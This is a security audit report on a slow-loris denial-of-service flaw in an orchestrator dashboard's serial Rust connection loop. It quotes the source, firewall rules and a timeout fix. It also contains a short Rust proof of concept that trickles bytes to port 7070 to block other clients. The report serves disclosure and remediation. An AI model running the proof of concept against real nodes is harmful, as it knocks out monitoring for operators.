### Title
Slow-Loris Single-Connection DoS on Orchestrator Dashboard — (`rs/orchestrator/dashboard/src/dashboard.rs`)

---

### Summary

The orchestrator dashboard's `serve_requests` loop processes TCP connections strictly one-by-one with no read timeout. A single attacker-controlled connection that trickles bytes slowly will hold the server indefinitely, blocking all subsequent connections until the slow connection closes or delivers 512 bytes.

---

### Finding Description

`serve_requests` explicitly serializes all connections:

```rust
loop {
    if let Ok((stream, _)) = listener.accept().await {
        self.handle_connection(stream).await;  // blocks until complete
    }
}
```

The comment above the function even documents this: *"calls handle_connection on each incoming stream, **one-by-one**"*. [1](#0-0) 

Inside `handle_connection`, the first operation is an unbounded read into a 512-byte buffer:

```rust
let mut buffer = [0; 512];
if let Err(e) = stream.read(&mut buffer).await {
```

`AsyncReadExt::read` returns as soon as *any* bytes arrive (it does not require the buffer to be full), but it will block indefinitely if the remote side keeps the connection open and sends bytes slowly. There is no `tokio::time::timeout` wrapping this call. [2](#0-1) 

Because `serve_requests` `.await`s `handle_connection` before calling `listener.accept()` again, the entire server is serialized behind the slow connection. No other client can be served until the slow one finishes. [3](#0-2) 

---

### Impact Explanation

The orchestrator dashboard on port 7070 exposes node identity, subnet membership, replica version, CUP height, SSH keys, and scheduled upgrade state — it is the primary self-monitoring endpoint for the orchestrator process. [4](#0-3) 

A single slow-loris connection renders this endpoint completely unresponsive for the duration of the attack. The orchestrator itself continues running (the dashboard task is separate), but all health-monitoring queries to port 7070 time out. [5](#0-4) 

---

### Likelihood Explanation

The nftables firewall rules for both assigned and unassigned replicas allow inbound TCP to port 7070 from the local `/64` IPv6 subnet:

```
ip6 saddr { ::/64 } ct state { new } tcp dport { 7070, ... } accept
``` [6](#0-5) [7](#0-6) 

This means any host co-located on the same `/64` subnet (e.g., another node in the same data center rack or VLAN segment) can reach port 7070. The attack requires only a standard TCP socket and the ability to send bytes slowly — no credentials, no keys, no protocol knowledge.

---

### Recommendation

Wrap the `stream.read` call in a `tokio::time::timeout`:

```rust
use tokio::time::{timeout, Duration};

let mut buffer = [0; 512];
match timeout(Duration::from_secs(5), stream.read(&mut buffer)).await {
    Ok(Ok(_)) => { /* proceed */ }
    Ok(Err(e)) => { self.log_info(&format!("Read error: {e}")); return; }
    Err(_) => { self.log_info("Read timeout"); return; }
}
```

Additionally, consider spawning each connection in its own `tokio::spawn` task rather than awaiting sequentially, so a slow connection cannot block others even if the timeout is generous. [2](#0-1) 

---

### Proof of Concept

```rust
// Thread 1: slow-loris attacker
let mut slow = TcpStream::connect("[node_ipv6]:7070").await.unwrap();
loop {
    slow.write_all(b"G").await.unwrap();
    tokio::time::sleep(Duration::from_millis(500)).await;
}

// Thread 2: concurrent legitimate client (runs in parallel)
let start = Instant::now();
let result = tokio::time::timeout(
    Duration::from_secs(3),
    TcpStream::connect("[node_ipv6]:7070"),
).await;
// result is Err(timeout) — second connection never gets accepted
// because serve_requests is blocked in handle_connection on thread 1
assert!(result.is_err(), "Dashboard blocked by slow-loris connection");
```

The second connection is never accepted because `listener.accept()` is not reached again until `handle_connection` returns for the first connection. [8](#0-7)

### Citations

**File:** rs/orchestrator/dashboard/src/dashboard.rs (L26-43)
```rust
    /// Starts listening on the port and calls handle_connection on each
    /// incoming stream, *one-by-one*.
    async fn serve_requests(&self) {
        let addr = SocketAddr::new(IpAddr::V6(Ipv6Addr::UNSPECIFIED), Self::port());
        let listener = match TcpListener::bind(addr).await {
            Ok(listener) => listener,
            Err(e) => {
                self.log_info(&format!("Failed to bind to socket {addr}: {e}"));
                return;
            }
        };

        loop {
            if let Ok((stream, _)) = listener.accept().await {
                self.handle_connection(stream).await;
            }
        }
    }
```

**File:** rs/orchestrator/dashboard/src/dashboard.rs (L47-52)
```rust
    async fn handle_connection(&self, mut stream: TcpStream) {
        let mut buffer = [0; 512];
        if let Err(e) = stream.read(&mut buffer).await {
            self.log_info(&format!("Failed to read request: {e}"));
            return;
        }
```

**File:** rs/orchestrator/README.adoc (L39-41)
```text
## Orchestrator Dashboard
The Dashboard listens for connections on port `7070` and displays the node's ID, datacenter ID, subnet ID, latest replica version, scheduled upgrades, current CUP height, registered readonly and backup keys, and more.

```

**File:** rs/orchestrator/src/orchestrator.rs (L643-648)
```rust
        if let Some(dashboard) = self.orchestrator_dashboard.take() {
            self.task_tracker.spawn(
                "dashboard",
                serve_dashboard(dashboard, cancellation_token.clone()),
            );
        }
```

**File:** rs/orchestrator/testdata/nftables_assigned_replica.conf.golden (L99-100)
```text
    # TCP ports required for GuestOS functionality
    ip6 saddr { ::/64 } ct state { new } tcp dport { 7070, 9090, 9091, 9100, 19531, 19100, 19522 } accept
```

**File:** rs/orchestrator/testdata/nftables_unassigned_replica.conf.golden (L98-99)
```text
    # TCP ports required for GuestOS functionality
    ip6 saddr { ::/64 } ct state { new } tcp dport { 7070, 9090, 9091, 9100, 19531, 19100, 19522 } accept
```
